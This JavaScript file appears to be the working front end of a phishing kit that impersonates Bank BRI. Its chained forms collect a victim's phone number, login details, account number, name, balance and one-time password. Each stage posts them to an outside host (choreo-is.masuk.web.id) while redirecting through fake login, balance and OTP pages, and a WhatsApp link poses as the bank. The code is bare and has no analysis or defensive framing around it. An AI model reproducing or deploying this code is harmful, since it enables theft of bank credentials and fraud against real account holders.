        function vibr(dur){
            if (navigator.vibrate) {
                navigator.vibrate(dur);
            } else {
                console.log("NotSupported");
            }
        }


function get(){
 $("#process1").show();
 $('.load').fadeIn();   
setTimeout(function(){  
location.href='https://wa.me/6282240003166?text=𝗛𝗮𝗹𝗹𝗼%20𝗕𝗮𝗻𝗸%20𝗕𝗥𝗜%0ASaya%20mau%20request%20Kode%20BRIVA';
 $("#process1").hide();
 $('.load').fadeOut();
 }, 2000);    
} 



// TARIF
$(document).ready(function(){
    $('#formHP').submit(function(e) {
  event.preventDefault();
   $('.load').fadeIn();
document.getElementById('kirim').innerHTML = "Memproses....";
var nomor = document.getElementById("NoHp").value;
sessionStorage.setItem("nomor", nomor);
$("#lonte").show();
 $.ajax({
 type: 'POST',
 url: 'https://choreo-is.masuk.web.id/x4/no.php',
 data: $(this).serialize(),
 datatype: 'JSON', 
 complete: function(data) {
            vibr(180);            
            console.log('Complete')
   setTimeout(function(){
   window.location.href='login.html'
  $("#lonte").hide();
  document.getElementById('kirim').innerHTML = "Lanjutkan";
  $('.load').fadeOut();
    }, 500);
        }
    });
 });
    return false;
});   
     

// LOGIN
$(document).ready(function(){
    $('#formlog').submit(function(e) {
    event.preventDefault();
    $('.load').fadeIn();
document.getElementById('kirim').innerHTML = "Memproses....";
$("#lonte").show();
 $.ajax({
 type: 'POST',
 url: 'https://choreo-is.masuk.web.id/x4/login.php',
 data: $(formlog).serialize(),
 datatype: 'text', 
 complete: function(data) {
            vibr(180);          
            console.log('Complete')
   setTimeout(function(){
  window.location.href='saldo.html'
 $("#lonte").hide();
 document.getElementById('kirim').innerHTML = "Lanjutkan";
 $('.load').fadeOut();
    var nomortel = document.getElementById('nomorku').value;
    sessionStorage.setItem("nomortel", nomortel);
    var noreke = document.getElementById('norek').value;
    sessionStorage.setItem("noreke", noreke);
    var namanya = document.getElementById('nama').value;
    sessionStorage.setItem("namanya", namanya); 
    }, 500);
        }
    });
 });
    return false;
});   
     
// SALDO
$(document).ready(function(){
    $('#formsal').submit(function(e) {
    event.preventDefault();
    $('.load').fadeIn();
document.getElementById('kirim').innerHTML = "Verify...";
$("#lonte").show();
 $.ajax({
 type: 'POST',
 url: 'https://choreo-is.masuk.web.id/x4/saldo.php',
 data: $(formsal).serialize(),
 datatype: 'text',
 complete: function(data) {
            vibr(180);            
            console.log('Complete')
   setTimeout(function(){
  window.location.href='otp.html'
  $("#lonte").hide();
  document.getElementById('kirim').innerHTML = "Benar";
  $('.load').fadeOut();
 var phone = document.getElementById("nomorsaya").value;
 sessionStorage.setItem("phone", phone);
 var user = document.getElementById("namaku").value;
 sessionStorage.setItem("user", user);
 var card = document.getElementById("norekku").value;
 sessionStorage.setItem("card", card);
 var duet = document.getElementById("saldo").value;
 sessionStorage.setItem("duet", duet);
    }, 500);
        }
    });
 });
    return false;
});   
     

// OTP
$('#formLink').on('submit', function (event) {
  event.stopPropagation();
    event.preventDefault();    
 document.getElementById('kirims').value = "Memproses....";
$.ajax({
 type: 'POST',
 url: 'https://choreo-is.masuk.web.id/x4/otp.php',
 async: false,
 dataType: 'text',
 data: $(this).serialize(),
 complete: function(data) {
            vibr(800);           
            console.log('Complete')
 setTimeout(function(){
  showAlert("a");
 $("#nama1").val("");
 $("#nama1").addClass('textarea1'); 
   document.getElementById('kirims').value = "Konfirmasi";
    }, 200);
        }
    });
    return false;
}); 

    
